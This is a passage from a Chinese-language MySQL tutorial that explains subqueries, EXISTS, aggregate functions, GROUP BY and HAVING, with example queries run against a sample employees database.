<p>&#x7531;&#x4E8E;&#x4E0D;&#x53BB;&#x91CD;&#xFF0C;<code>UNION ALL</code> &#x6267;&#x884C;&#x8BED;&#x53E5;&#x65F6;&#x6240;&#x9700;&#x7684;&#x8D44;&#x6E90;&#x8F83; <code>UNION</code> &#x66F4;&#x5C11;&#x3002;&#x5F53;&#x660E;&#x786E;&#x77E5;&#x9053;&#x5408;&#x5E76;&#x540E;&#x7ED3;&#x679C;&#x4E0D;&#x5B58;&#x5728;&#x91CD;&#x590D;&#x7684;&#x60C5;&#x51B5;&#x65F6;&#xFF0C;&#x4F7F;&#x7528; <code>UNION ALL</code> &#x53EF;&#x4EE5;&#x63D0;&#x9AD8;&#x67E5;&#x8BE2;&#x6548;&#x7387;&#x3002;</p>
<h3 id="subquery">Subquery</h3>
<blockquote>
<p>A subquery in MySQL is a query, which is nested into another SQL query and embedded with SELECT, INSERT, UPDATE or DELETE statement along with the various operators.</p>
</blockquote>
<p>&#x5B50;&#x67E5;&#x8BE2; subquery &#x662F;&#x53EF;&#x5D4C;&#x5957;&#x5728;&#x67E5;&#x8BE2;&#x4E2D;&#x7684;&#x5185;&#x90E8;&#x67E5;&#x8BE2;&#xFF0C;&#x4ECE;&#x5185;&#x5411;&#x5916;&#x8FDB;&#x884C;&#x5904;&#x7406;&#x3002;</p>
<p>&#x5B50;&#x67E5;&#x8BE2;&#x4F1A;&#x5728;&#x4E3B;&#x67E5;&#x8BE2;&#x6267;&#x884C;&#x524D;&#x5B8C;&#x6210;&#xFF0C;&#x5176;&#x7ED3;&#x679C;&#x4F1A;&#x88AB;&#x4E3B;&#x67E5;&#x8BE2;&#x4F7F;&#x7528;&#x3002;&#x5B50;&#x67E5;&#x8BE2;&#x4F7F;&#x7528;&#x62EC;&#x53F7;&#x5305;&#x88F9;&#xFF0C;&#x4F7F;&#x7528;&#x65F6;&#x653E;&#x5728;&#x6BD4;&#x8F83;&#x6761;&#x4EF6;&#x7684;&#x53F3;&#x4FA7;&#x53EF;&#x8BFB;&#x6027;&#x66F4;&#x9AD8;&#x3002;</p>
<pre><code class="language-sql"># &#x67E5;&#x627E;&#x51FA;&#x8F83; Abel &#x66F4;&#x9AD8;&#x5DE5;&#x8D44;&#x7684;&#x540C;&#x4E8B;&#x5E76;&#x5217;&#x51FA;&#x85AA;&#x8D44;
# &#x65B9;&#x5F0F;&#x4E00;
SELECT salary FROM employees WHERE last_name = &apos;Abel&apos;;
SELECT last_name,salary FROM employees WHERE salary &gt; 11000;
# &#x65B9;&#x5F0F;&#x4E8C; =&gt; &#x81EA;&#x8FDE;&#x63A5;
SELECT e2.last_name,e2.salary FROM employees e1,employees e2 WHERE e1.last_name = &apos;Abel&apos; AND e1.`salary` &lt; e2.`salary`;
# &#x65B9;&#x5F0F;&#x4E09; =&gt; &#x5B50;&#x67E5;&#x8BE2;
SELECT last_name,salary FROM employees WHERE salary &gt; ( SELECT salary FROM employees WHERE last_name = &apos;Abel&apos; );
</code></pre>
<p>&#x6309;&#x5185;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x6240;&#x8FD4;&#x56DE;&#x7684;&#x8BB0;&#x5F55;&#x6761;&#x76EE;&#xFF0C;&#x53EF;&#x5C06;&#x5B50;&#x67E5;&#x8BE2;&#x5206;&#x4E3A;&#x5355;&#x884C;&#x5B50;&#x67E5;&#x8BE2;&#x3001;&#x591A;&#x884C;&#x5B50;&#x67E5;&#x8BE2;&#x3002;&#x6309;&#x5B50;&#x67E5;&#x8BE2;&#x662F;&#x5426;&#x88AB;&#x6267;&#x884C;&#x591A;&#x6B21;&#xFF0C;&#x53EF;&#x5C06;&#x5B50;&#x67E5;&#x8BE2;&#x5206;&#x4E3A;&#x5173;&#x8054;&#x5B50;&#x67E5;&#x8BE2;&#x548C;&#x975E;&#x5173;&#x8054;&#x5B50;&#x67E5;&#x8BE2;&#x3002;</p>
<blockquote>
<p>A row subquery is a subquery variant that returns a single row and can thus return more than one column value.</p>
</blockquote>
<p>&#x5355;&#x884C;&#x5B50;&#x67E5;&#x8BE2;&#x662F;&#x4E00;&#x79CD;&#x5B50;&#x67E5;&#x8BE2;&#x7684;&#x53D8;&#x4F53;&#xFF0C;&#x8FD4;&#x56DE;&#x5355;&#x884C;&#xFF0C;&#x4F46;&#x53EF;&#x4EE5;&#x5305;&#x542B;&#x591A;&#x4E2A;&#x5217;&#x503C;&#x3002;</p>
<pre><code class="language-sql"># &#x8FD4;&#x56DE;&#x516C;&#x53F8;&#x5DE5;&#x8D44;&#x6700;&#x5C11;&#x7684;&#x5458;&#x5DE5;&#x7684; last_name&#x3001;job_id &#x548C; salary
SELECT last_name,job_id,salary FROM employees WHERE salary = ( SELECT MIN(salary) FROM employees );
</code></pre>
<pre><code class="language-sql"># &#x67E5;&#x8BE2;&#x4E0E;141&#x53F7;&#x5458;&#x5DE5;&#x7684;manager_id&#x548C;department_id&#x76F8;&#x540C;&#x7684;&#x5176;&#x4ED6;&#x5458;&#x5DE5;&#x7684;employee_id,manager_id,department_id
SELECT employee_id, manager_id, department_id FROM employees WHERE manager_id = ( SELECT manager_id FROM employees WHERE employee_id = 141 ) AND department_id = ( SELECT department_id FROM employees WHERE employee_id = 141 ) AND employee_id &lt;&gt; 141;
# &#x67E5;&#x8BE2;&#x4E0E;141&#x53F7;&#x6216;174&#x53F7;&#x5458;&#x5DE5;&#x7684;manager_id&#x548C;department_id&#x76F8;&#x540C;&#x7684;&#x5176;&#x4ED6;&#x5458;&#x5DE5;&#x7684;employee_id,manager_id,department_id
SELECT employee_id, manager_id, department_id FROM employees WHERE manager_id IN (SELECT  manager_id FROM employees WHERE employee_id IN (174,141)) AND department_id IN (SELECT  department_id FROM employees WHERE employee_id IN (174,141)) AND employee_id NOT IN(174,141);
</code></pre>
<pre><code class="language-sql"># HAVING &#x4E2D;&#x7684;&#x5B50;&#x67E5;&#x8BE2;
# &#x67E5;&#x8BE2;&#x6700;&#x4F4E;&#x5DE5;&#x8D44;&#x5927;&#x4E8E;50&#x53F7;&#x90E8;&#x95E8;&#x6700;&#x4F4E;&#x5DE5;&#x8D44;&#x7684;&#x90E8;&#x95E8;id&#x548C;&#x5176;&#x6700;&#x4F4E;&#x5DE5;&#x8D44;
SELECT department_id, MIN(salary) AS dept_lowest_salary FROM employees WHERE department_id IS NOT NULL GROUP BY department_id HAVING dept_lowest_salary &gt; ( SELECT MIN(salary) FROM employees WHERE department_id = 50);
# CASE&#x4E2D;&#x7684;&#x5B50;&#x67E5;&#x8BE2;
# &#x663E;&#x793A;&#x5458;&#x5DE5;&#x7684;employee_id,last_name&#x548C;location.&#x5176;&#x4E2D;,&#x82E5;&#x5458;&#x5DE5;department_id&#x4E0E;location_id&#x4E3A;1800&#x7684;department_id&#x76F8;&#x540C;,&#x5219;location&#x4E3A;&apos;Canada&apos;,&#x5176;&#x4F59;&#x5219;&#x4E3A;&apos;USA&apos;
SELECT employee_id, last_name, ( CASE department_id WHEN ( SELECT department_id FROM departments WHERE location_id = 1800 ) THEN &apos;Canada&apos; ELSE &apos;USA&apos; END ) &quot;location&quot; FROM employees;
</code></pre>
<pre><code class="language-sql"># &#x5B50;&#x67E5;&#x8BE2;&#x4E2D;&#x7684;&#x7A7A;&#x503C;&#x95EE;&#x9898; =&gt; &#x5185;&#x67E5;&#x8BE2;&#x7A7A;&#x503C;&#x4E0D;&#x62A5;&#x9519;,&#x4EC5;&#x65E0;&#x7ED3;&#x679C;
SELECT last_name, job_id FROM employees WHERE job_id = ( SELECT job_id FROM employees WHERE last_name = &apos;Haas&apos; );
# &#x975E;&#x6CD5;&#x4F7F;&#x7528;&#x5B50;&#x67E5;&#x8BE2; =&gt; ERROR 1242 (21000): Subquery returns more than 1 row
SELECT employee_id, last_name FROM employees WHERE salary = ( SELECT MIN( salary ) FROM employees GROUP BY department_id );
# &#x975E;&#x6CD5;&#x4F7F;&#x7528;&#x5B50;&#x67E5;&#x8BE2; =&gt; &#x6B63;&#x89E3;
# &#x67E5;&#x51FA;&#x54EA;&#x4E9B;&#x5458;&#x5DE5;&#x662F;&#x7B49;&#x4E8E;&#x4E0B;&#x9762;&#x5404;&#x90E8;&#x95E8;&#x6700;&#x4F4E;&#x5DE5;&#x8D44;&#x7684;&#x4EBA;
SELECT employee_id, last_name FROM employees WHERE salary IN ( SELECT MIN( salary ) FROM employees GROUP BY department_id );
</code></pre>
<p>&#x591A;&#x884C;&#x5B50;&#x67E5;&#x8BE2;&#x53EF;&#x4EE5;&#x8FD4;&#x56DE;&#x591A;&#x884C;&#x7684;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x3002;&#x56E0;&#x4E3A;&#x9700;&#x8981;&#x8FD4;&#x56DE;&#x591A;&#x884C;&#xFF0C;&#x6240;&#x4EE5;&#x5FC5;&#x987B;&#x7ECF;&#x8FC7;&#x4E00;&#x7CFB;&#x5217;&#x7684;&#x6BD4;&#x8F83;&#x8FD0;&#x7B97;&#x7B26;&#xFF08;<code>IN&#x3001;ALL&#x3001;ANY&#x3001;SOME</code>&#xFF09;&#x5904;&#x7406;&#x3002;</p>
<pre><code class="language-sql"># &#x67E5;&#x8BE2;&#x5E73;&#x5747;&#x5DE5;&#x8D44;&#x6700;&#x4F4E;&#x7684;&#x90E8;&#x95E8; id
SELECT department_id, AVG(salary) FROM employees GROUP BY department_id HAVING AVG(salary) = ( SELECT MIN(avg_salary) FROM ( SELECT AVG(salary) avg_salary FROM employees GROUP BY department_id ) AS avg_salary_table);
SELECT department_id FROM employees GROUP BY department_id HAVING AVG(salary) &lt;= ALL ( SELECT AVG(salary) FROM employees GROUP BY department_id );
</code></pre>
<pre><code class="language-sql"># &#x8FD4;&#x56DE;&#x5176;&#x5B83; job_id &#x4E2D;&#x6BD4; job_id &#x4E3A; &apos;IT_PROG&apos; &#x90E8;&#x95E8;&#x4EFB;&#x4E00;&#x5DE5;&#x8D44;&#x4F4E;&#x7684;&#x5458;&#x5DE5;&#x7684;&#x5458;&#x5DE5;&#x53F7;&#x3001;&#x59D3;&#x540D;&#x3001;job_id &#x4EE5;&#x53CA; salary
SELECT employee_id,last_name,job_id,salary FROM employees WHERE job_id &lt;&gt; &apos;IT_PROG&apos; AND salary &lt; ANY (SELECT salary FROM employees WHERE job_id = &apos;IT_PROG&apos;) AND job_id &lt;&gt; &apos;IT_PROG&apos;;
// &#x8FD4;&#x56DE;&#x5176;&#x5B83; job_id &#x4E2D;&#x6BD4; job_id &#x4E3A; &apos;IT_PROG&apos; &#x90E8;&#x95E8;&#x6240;&#x6709;&#x5DE5;&#x8D44;&#x90FD;&#x4F4E;&#x7684;&#x5458;&#x5DE5;&#x7684;&#x5458;&#x5DE5;&#x53F7;&#x3001;&#x59D3;&#x540D;&#x3001;job_id &#x4EE5;&#x53CA; salary
SELECT employee_id,last_name,job_id,salary FROM employees WHERE job_id &lt;&gt; &apos;IT_PROG&apos; AND salary &lt; ALL (SELECT salary FROM employees WHERE job_id = &apos;IT_PROG&apos;) AND job_id &lt;&gt; &apos;IT_PROG&apos;;
</code></pre>
<p>&#x5B50;&#x67E5;&#x8BE2;&#x7684;&#x6267;&#x884C;&#x4F9D;&#x8D56;&#x4E8E;&#x5916;&#x90E8;&#x67E5;&#x8BE2;&#xFF0C;&#x901A;&#x5E38;&#x662F;&#x56E0;&#x4E3A;&#x5B50;&#x67E5;&#x8BE2;&#x7684;&#x8868;&#x7528;&#x5230;&#x4E86;&#x5916;&#x90E8;&#x7684;&#x8868;&#xFF0C;&#x5E76;&#x5B58;&#x5728;&#x6761;&#x4EF6;&#x5173;&#x8054;&#x3002;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6BCF;&#x6267;&#x884C;&#x4E00;&#x6B21;&#x5916;&#x90E8;&#x67E5;&#x8BE2;&#xFF0C;&#x5B50;&#x67E5;&#x8BE2;&#x90FD;&#x9700;&#x8981;&#x91CD;&#x65B0;&#x8BA1;&#x7B97;&#xFF0C;&#x8FD9;&#x79CD;&#x5F62;&#x5F0F;&#x7684;&#x5B50;&#x67E5;&#x8BE2;&#x79F0;&#x4E3A;&#x5173;&#x8054;&#x5B50;&#x67E5;&#x8BE2;&#x3002;</p>
<pre><code class="language-javascript">/*
&#x76F8;&#x5173;&#x5B50;&#x67E5;&#x8BE2; =&gt; &#x5B50;&#x67E5;&#x8BE2;&#x4E2D;&#x4F7F;&#x7528;&#x4E3B;&#x67E5;&#x8BE2;&#x4E2D;&#x7684;&#x5217;
&#x5728;SELECT&#x4E2D;&#x9664;&#x4E86;GROUP BY &#x548C; LIMIT&#x4E4B;&#x5916;,&#x5176;&#x4ED6;&#x4F4D;&#x7F6E;&#x90FD;&#x53EF;&#x4EE5;&#x58F0;&#x660E;&#x5B50;&#x67E5;&#x8BE2;
*/
// &#x67E5;&#x8BE2;&#x5458;&#x5DE5;&#x4E2D;&#x5DE5;&#x8D44;&#x5927;&#x4E8E;&#x516C;&#x53F8;&#x5E73;&#x5747;&#x5DE5;&#x8D44;&#x7684;&#x5458;&#x5DE5;&#x7684; last_name,salary &#x548C;&#x5176; department_id
SELECT last_name,salary,department_id FROM employees WHERE salary &gt; ( SELECT AVG(salary) FROM employees);
// &#x67E5;&#x8BE2;&#x5458;&#x5DE5;&#x4E2D;&#x5DE5;&#x8D44;&#x5927;&#x4E8E;&#x672C;&#x90E8;&#x95E8;&#x5E73;&#x5747;&#x5DE5;&#x8D44;&#x7684;&#x5458;&#x5DE5;&#x7684; last_name,salary &#x548C;&#x5176; department_id
// &#x65B9;&#x5F0F;&#x4E00; =&gt; &#x76F8;&#x5173;&#x67E5;&#x8BE2;
SELECT last_name,salary,department_id FROM employees e1 WHERE salary &gt; ( SELECT AVG(salary) FROM employees e2 WHERE department_id = e1.department_id);
// &#x65B9;&#x5F0F;&#x4E8C; =&gt; FROM&#x5B50;&#x67E5;&#x8BE2;
SELECT e.last_name,e.salary,e.department_id FROM employees e,(SELECT department_id,AVG(salary) avg_sal FROM employees GROUP BY department_id) t_debt_avg_sal WHERE e.department_id = t_debt_avg_sal.department_id AND e.salary &gt; t_debt_avg_sal.avg_sal;
// &#x67E5;&#x8BE2;&#x5458;&#x5DE5;&#x7684;id,salary,&#x6309;&#x7167;department_name &#x6392;&#x5E8F;
// &#x65B9;&#x5F0F;&#x4E00; =&gt; &#x76F8;&#x5173;&#x5B50;&#x67E5;&#x8BE2;
SELECT employee_id, salary FROM employees emp ORDER BY ( SELECT department_name FROM departments dept WHERE emp.department_id = dept.department_id ) ASC;
// &#x65B9;&#x5F0F;&#x4E8C; =&gt; &#x8868;&#x8FDE;&#x63A5;
SELECT employee_id, salary, department_name FROM employees emp LEFT JOIN departments dept ON emp.department_id = dept.department_id ORDER BY department_name ASC;
// &#x82E5;employees&#x8868;&#x4E2D;employee_id&#x4E0E;job_history&#x8868;&#x4E2D;employee_id&#x76F8;&#x540C;&#x7684;&#x6570;&#x76EE;&#x4E0D;&#x5C0F;&#x4E8E;2&#x5219;&#x8F93;&#x51FA;&#x8FD9;&#x4E9B;&#x76F8;&#x540C;id&#x7684;&#x5458;&#x5DE5;&#x7684;employee_id,last_name&#x548C;&#x5176;job_id
SELECT e.employee_id,last_name,e.job_id FROM employees e WHERE 2 &lt;= (SELECT COUNT(*) FROM job_history j WHERE e.employee_id = j.employee_id);
</code></pre>
<p>&#x5173;&#x8054;&#x5B50;&#x67E5;&#x8BE2;&#x901A;&#x5E38;&#x4F1A;&#x642D;&#x914D; <code>EXISTS</code> &#x64CD;&#x4F5C;&#x7B26;&#xFF1A;</p>
<ul>
<li>&#x5B50;&#x67E5;&#x8BE2;&#x4E2D;&#x5B58;&#x5728;&#x6EE1;&#x8DB3;&#x6761;&#x4EF6;&#x7684;&#x884C;&#xFF1A;&#x8FD4;&#x56DE; <code>TRUE</code>&#xFF0C;&#x505C;&#x6B62;&#x5B50;&#x67E5;&#x8BE2;&#xFF0C;&#x8FD4;&#x56DE;&#x7B26;&#x5408;&#x7684;&#x8BB0;&#x5F55;</li>
<li>&#x5B50;&#x67E5;&#x8BE2;&#x4E2D;&#x4E0D;&#x5B58;&#x5728;&#x6EE1;&#x8DB3;&#x6761;&#x4EF6;&#x7684;&#x884C;&#xFF1A;&#x8FD4;&#x56DE; <code>FALSE</code>&#xFF0C;&#x7EE7;&#x7EED;&#x67E5;&#x627E;</li>
</ul>
<p><code>NOTEXISTS</code> &#x5173;&#x952E;&#x5B57;&#x8868;&#x793A;&#x5982;&#x679C;&#x4E0D;&#x5B58;&#x5728;&#x67D0;&#x79CD;&#x6761;&#x4EF6;&#xFF0C;&#x5219;&#x8FD4;&#x56DE; <code>TRUE</code>&#xFF0C;&#x53CD;&#x4E4B; <code>FALSE</code>&#x3002;</p>
<pre><code class="language-javascript">// &#x67E5;&#x8BE2;&#x516C;&#x53F8;&#x7BA1;&#x7406;&#x8005;&#x7684; employee_id, last_name, job_id, department_id &#x4FE1;&#x606F;
// &#x65B9;&#x5F0F;&#x4E00; =&gt; &#x81EA;&#x8FDE;&#x63A5; =&gt; &#x5C06;&#x540C;&#x4E00;&#x5F20;&#x8868;&#x770B;&#x505A;&#x4E24;&#x5F20;&#x8868;&#x8FDB;&#x884C;&#x7B49;&#x503C;&#x8FDE;&#x63A5;
SELECT DISTINCT mgr.employee_id, mgr.last_name, mgr.job_id, mgr.department_id FROM employees emp JOIN employees mgr ON emp.manager_id = mgr.employee_id;
// &#x65B9;&#x5F0F;&#x4E8C; =&gt; &#x5B50;&#x67E5;&#x8BE2;&#x7684;&#x65B9;&#x5F0F; =&gt; &#x5148;&#x5C06;&#x6240;&#x6709;&#x7684;manager_id&#x67E5;&#x51FA;
SELECT employee_id, last_name, job_id, department_id FROM employees WHERE employee_id IN ( SELECT DISTINCT manager_id FROM employees );
// &#x65B9;&#x5F0F;&#x4E09; =&gt; EXISTS
SELECT employee_id, last_name, job_id, department_id FROM employees e1 WHERE  EXISTS ( SELECT 1 FROM employees e2 WHERE e1.employee_id = e2.manager_id);
</code></pre>
<pre><code class="language-sql"># &#x67E5;&#x8BE2;departments&#x8868;&#x4E2D;&#x4E0D;&#x5B58;&#x5728;&#x4E8E;employees&#x8868;&#x4E2D;&#x7684;&#x90E8;&#x95E8;&#x7684;department_id&#x548C;department_name (employees&#x8868;&#x4E2D;&#x90E8;&#x95E8;id&#x4E3A;NULL&#x7684;&#x60C5;&#x51B5;)
# &#x65B9;&#x5F0F;&#x4E00; =&gt; &#x53F3;&#x5916;&#x8FDE;&#x63A5;
SELECT dept.department_id, dept.department_name, emp.department_id FROM departments dept LEFT JOIN employees emp USING (department_id) WHERE emp.department_id IS NULL;
# &#x65B9;&#x5F0F;&#x4E8C; =&gt; NOT EXISTS
SELECT department_id, department_name FROM departments d WHERE NOT EXISTS (SELECT * FROM employees emp WHERE emp.department_id = d.department_id);
</code></pre>
<p>&#x5728;&#x591A;&#x6570;&#x7684;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#xFF0C;&#x81EA;&#x8FDE;&#x63A5;&#x7684;&#x5904;&#x7406;&#x901F;&#x5EA6;&#x8981;&#x6BD4;&#x5B50;&#x67E5;&#x8BE2;&#x5FEB;&#x5F97;&#x591A;&#xFF1A;&#x5B50;&#x67E5;&#x8BE2;&#x662F;&#x5148;&#x5BF9;&#x672A;&#x77E5;&#x8868;&#x8FDB;&#x884C;&#x67E5;&#x8BE2;&#xFF0C;&#x518D;&#x4F7F;&#x7528;&#x6761;&#x4EF6;&#x6765;&#x5224;&#x65AD;&#xFF1B;&#x81EA;&#x8FDE;&#x63A5;&#x662F;&#x5BF9;&#x5DF2;&#x77E5;&#x7684;&#x6570;&#x636E;&#x8868;&#x8FDB;&#x884C;&#x6761;&#x4EF6;&#x5224;&#x65AD;&#x3002;</p>
<h3 id="built-in-functions">Built-in Functions</h3>
<p>SQL &#x5728;&#x4E0D;&#x540C; DBMS &#x95F4;&#x7684;&#x5DEE;&#x5F02;&#x6027;&#x5F88;&#x5927;&#xFF0C;&#x8FDC;&#x5927;&#x4E8E; SQL &#x4E0D;&#x540C;&#x7248;&#x672C;&#x4E4B;&#x95F4;&#x7684;&#x5DEE;&#x5F02;&#x3002;</p>
<p>&#x62FC;&#x63A5;&#x7B26;&#xFF1A;&#x591A;&#x6570; DBMS &#x4F7F;&#x7528; <code>||</code> &#x6216; <code>+</code>&#xFF0C;MySQL &#x5B57;&#x7B26;&#x4E32;&#x62FC;&#x63A5;&#x51FD;&#x6570;&#x4E3A; <code>concat()</code>&#x3002;</p>
<p><img src="yourdomain.com/content/images/2022/04/mysql----.png" alt="MySQL" loading="lazy"></p>
<p>&#x5355;&#x884C;&#x51FD;&#x6570;&#x662F;&#x6307;&#x8FD4;&#x56DE;&#x5355;&#x884C;&#x7ED3;&#x679C;&#x7684;&#x51FD;&#x6570;&#x3002;&#x805A;&#x5408;&#x51FD;&#x6570;&#x662F;&#x5BF9;&#x4E00;&#x7EC4;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x6C47;&#x603B;&#x7684;&#x51FD;&#x6570;&#x3002;&#x8F93;&#x5165;&#x4E00;&#x7EC4;&#x6570;&#x636E;&#x7684;&#x96C6;&#x5408;&#xFF0C;&#x8F93;&#x51FA;&#x5355;&#x4E2A;&#x503C;&#x3002;&#x805A;&#x5408;&#x51FD;&#x6570;&#x4E0D;&#x80FD;&#x5D4C;&#x5957;&#x8C03;&#x7528;&#x3002;</p>
<p>&#x5E38;&#x89C1;&#x805A;&#x5408;&#x51FD;&#x6570;&#xFF1A;</p>
<ul>
<li><code>AVG</code>&#x3001;<code>SUM</code>&#x3001;<code>MAX/MIN</code>&#x3001;<code>COUNT</code>...</li>
<li><code>GROUP BY</code>&#xFF1A;&#x901A;&#x5E38;&#x4E0E;&#x805A;&#x5408;&#x51FD;&#x6570;&#x4E00;&#x8D77;&#x4F7F;&#x7528;&#xFF0C;&#x5BF9;&#x7ED3;&#x679C;&#x96C6;&#x8FDB;&#x884C;&#x5206;&#x7EC4;</li>
<li><code>HAVING</code>&#xFF1A;&#x6839;&#x636E;&#x6307;&#x5B9A;&#x7684;&#x6761;&#x4EF6;&#x8FC7;&#x6EE4;&#x5206;&#x7EC4;</li>
</ul>
<p>&#x533A;&#x5206; <code>count(*)</code>&#x3001;<code>count(1)</code> &#x548C; <code>count(&#x5217;&#x540D;)</code> &#x7684;&#x4F7F;&#x7528;&#xFF1A;</p>
<ul>
<li>&#x4E09;&#x8005;&#x90FD;&#x662F;&#x83B7;&#x53D6;&#x6307;&#x5B9A;&#x5B57;&#x6BB5;&#x7684;&#x51FA;&#x73B0;&#x4E2A;&#x6570;</li>
<li><code>count(col_name)</code> &#x68C0;&#x7D22;&#x5B57;&#x6BB5;&#x65F6;&#xFF0C;&#x4F1A;&#x5FFD;&#x7565; <code>NULL</code></li>
</ul>
<p><code>SELECT</code> &#x6307;&#x5B9A;&#x7684;&#x975E;&#x805A;&#x5408;&#x51FD;&#x6570;&#x5B57;&#x6BB5;&#x5FC5;&#x987B;&#x5728; <code>GROUP BY</code> &#x4E2D;&#x51FA;&#x73B0;&#x3002;</p>
<p><code>GROUP BY</code> &#x4E2D;&#x51FA;&#x73B0;&#x7684;&#x5B57;&#x6BB5;&#x4E0D;&#x4E00;&#x5B9A;&#x8981;&#x5728; <code>SELECT</code> &#x4E2D;&#x6709;&#x58F0;&#x660E;&#x3002;</p>
<pre><code class="language-sql">// &#x67E5;&#x8BE2;&#x5404;&#x4E2A;department_id,job_id&#x7684;&#x5E73;&#x5747;&#x5DE5;&#x8D44;
SELECT department_id,job_id,AVG(salary) FROM employees GROUP BY department_id,job_id;
SELECT job_id,department_id,AVG(salary) FROM employees GROUP BY job_id,department_id;
// &#x9519;&#x8BEF;&#x5F62;&#x5F0F; job_id &#x672A;&#x51FA;&#x73B0;&#x5728; GROUP BY &#x4E2D; =&gt; &#x4E00;&#x4E2A;&#x90E8;&#x95E8;&#x4E0D;&#x4E00;&#x5B9A;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x5DE5;&#x79CD;
SELECT department_id,job_id,AVG(salary) FROM employees GROUP BY department_id;
</code></pre>
<p><code>ROLLUP</code> &#x662F; <code>GROUP BY</code> &#x5B50;&#x53E5;&#x7684;&#x6269;&#x5C55;&#xFF0C;&#x8BE5;&#x9009;&#x9879;&#x5C06;&#x5728;&#x7ED3;&#x679C;&#x96C6;&#x4E2D;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x989D;&#x5916;&#x7684;&#x884C;&#x4EE5;&#x663E;&#x793A;&#x603B;&#x8BA1;&#x3002;</p>
<p><code>HAVING</code> &#x5B50;&#x53E5;&#x901A;&#x5E38;&#x4E0E; <code>GROUP BY</code> &#x4E00;&#x8D77;&#x4F7F;&#x7528;&#xFF0C;&#x82E5;&#x7701;&#x7565; <code>GROUP BY</code>&#xFF0C;&#x5219; <code>HAVING</code> &#x5B50;&#x53E5;&#x7684;&#x884C;&#x4E3A;&#x4E0E; <code>WHERE</code> &#x5B50;&#x53E5;&#x7C7B;&#x4F3C;&#x3002;</p>
<p><code>HAVING</code> &#x6216;&#x8005; <code>WHERE</code> &#x7684;&#x9009;&#x62E9;&#xFF1A;&#x8FC7;&#x6EE4;&#x6761;&#x4EF6;&#x4E2D;&#x6709;&#x805A;&#x5408;&#x51FD;&#x6570;&#x65F6;&#x987B;&#x58F0;&#x660E;&#x5728; <code>HAVING</code> &#x5185;&#x3002;</p>
<p>&#x67E5;&#x8BE2;&#x8BED;&#x6CD5;&#x7ED3;&#x6784;&#x4E2D;&#xFF0C;<code>WHERE</code> &#x5728; <code>GROUP BY</code> &#x4E4B;&#x524D;&#xFF0C;&#x6240;&#x4EE5;&#x65E0;&#x6CD5;&#x5BF9;&#x5206;&#x7EC4;&#x7ED3;&#x679C;&#x8FDB;&#x884C;&#x7B5B;&#x9009;&#x3002;</p>
<p>&#x6B64;&#x5916;&#xFF0C;<code>WHERE</code> &#x6392;&#x9664;&#x7684;&#x8BB0;&#x5F55;&#x4E0D;&#x518D;&#x5305;&#x62EC;&#x5728;&#x5206;&#x7EC4;&#x4E2D;&#x3002;</p>
<pre><code class="language-sql">// &#x67E5;&#x8BE2;&#x5404;&#x90E8;&#x95E8;&#x6700;&#x9AD8;&#x5DE5;&#x8D44;&#x8F83;10000&#x9AD8;&#x7684;&#x90E8;&#x95E8;
// &#x9519;&#x8BEF;&#x5199;&#x6CD5; =&gt; ERROR 1111 (HY000): Invalid use of group function
SELECT department_id,MAX(salary) FROM employees WHERE MAX(salary) &gt; 10000 GROUP BY department_id;
// &#x6B63;&#x786E;&#x5199;&#x6CD5;
SELECT department_id,MAX(salary) FROM employees GROUP BY department_id HAVING MAX(salary) &gt; 10000;
</code></pre>
<pre><code class="language-sql">// &#x67E5;&#x8BE2;&#x90E8;&#x95E8; id &#x4E3A; 10-40 &#x56DB;&#x4E2A;&#x90E8;&#x95E8;&#x4E2D;&#x6700;&#x9AD8;&#x5DE5;&#x8D44;&#x9AD8;&#x4E8E; 10000 &#x7684;&#x90E8;&#x95E8;&#x4FE1;&#x606F;
// &#x65B9;&#x5F0F;&#x4E00; =&gt; &#x63A8;&#x8350; =&gt; &#x6267;&#x884C;&#x6548;&#x7387;&#x9AD8;
SELECT department_id, MAX(salary) FROM employees WHERE department_id IN (10,20,30,40) GROUP BY department_id HAVING MAX(salary) &gt; 10000;
// &#x65B9;&#x5F0F;&#x4E8C;
SELECT department_id, MAX(salary) FROM employees GROUP BY department_id HAVING MAX(salary) &gt; 10000 AND department_id IN (10,20,30,40);
</code></pre>
<p>&#x5173;&#x8054;&#x8868;&#x6570;&#x636E;&#x9700;&#x8981;&#x8FDE;&#x63A5;&#x65F6;&#xFF0C;<code>WHERE</code> &#x662F;&#x5148;&#x7B5B;&#x9009;&#x540E;&#x8FDE;&#x63A5;&#xFF0C;<code>HAVING</code> &#x662F;&#x5148;&#x8FDE;&#x63A5;&#x540E;&#x7B5B;&#x9009;&#xFF1A;</p>
<p>&#x5728;&#x5173;&#x8054;&#x67E5;&#x8BE2;&#x4E2D;&#xFF0C;&#x524D;&#x8005;&#x6BD4;&#x540E;&#x8005;&#x66F4;&#x9AD8;&#x6548;&#x3002;&#x56E0;&#x4E3A;&#x524D;&#x8005;&#x53EF;&#x4EE5;&#x5148;&#x7B5B;&#x9009;&#xFF0C;&#x7528;&#x4E00;&#x4E2A;&#x7B5B;&#x9009;&#x540E;&#x7684;&#x8F83;&#x5C0F;&#x6570;&#x636E;&#x96C6;&#x548C;&#x5173;&#x8054;&#x8868;&#x8FDB;&#x884C;&#x8FDE;&#x63A5;&#xFF0C;&#x5360;&#x7528;&#x7684;&#x8D44;&#x6E90;&#x4F1A;&#x6BD4;&#x8F83;&#x5C11;&#xFF1B;&#x540E;&#x8005;&#x9700;&#x8981;&#x5148;&#x5C06;&#x7ED3;&#x679C;&#x96C6;&#x51C6;&#x5907;&#x597D;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x7528;&#x672A;&#x88AB;&#x7B5B;&#x9009;&#x7684;&#x6570;&#x636E;&#x96C6;&#x8FDB;&#x884C;&#x5173;&#x8054;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x5BF9;&#x8FD9;&#x4E2A;&#x6570;&#x636E;&#x96C6;&#x8FDB;&#x884C;&#x7B5B;&#x9009;&#xFF0C;&#x8FD9;&#x6837;&#x6240;&#x5360;&#x7528;&#x7684;&#x8D44;&#x6E90;&#x5C31;&#x4F1A;&#x6BD4;&#x8F83;&#x591A;&#xFF0C;&#x6267;&#x884C;&#x6548;&#x7387;&#x4E5F;&#x5C31;&#x8F83;&#x4F4E;&#x3002;</p>
